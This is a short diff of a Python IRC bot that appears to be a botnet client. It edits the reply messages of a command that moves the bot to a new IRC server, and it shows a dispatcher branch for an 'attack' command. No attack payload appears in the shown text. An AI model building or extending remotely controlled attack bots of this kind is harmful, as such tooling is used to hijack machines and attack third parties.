@@ -52,7 +52,7 @@ def move(s, sender, host, port, chan):
     HOST = host
     PORT = int(port)
     CHAN = chan
-    s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : moved to new IRC SERVER\r\n', 'utf-8'))
+    s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : move success to new IRC SERVER\r\n', 'utf-8'))
     s.send("QUIT\r\n".format(CHAN).encode("utf-8"))
 
 #takes in a list
@@ -181,7 +181,7 @@ if __name__ == "__main__":
                                         move(s, sender, arguments[1], arguments[2], arguments[3])
                                         break
                                     else:
-                                        s.send(('PRIVMSG ' + sender + ' :' + NICK + ' : invalid move\r\n').encode('utf-8'))
+                                        s.send(('PRIVMSG ' + sender + ' :' + NICK + ' : failed to move to new server\r\n').encode('utf-8'))
                                 
                                 #should be working, has error checking too
                                 elif 'attack' in args[1]:
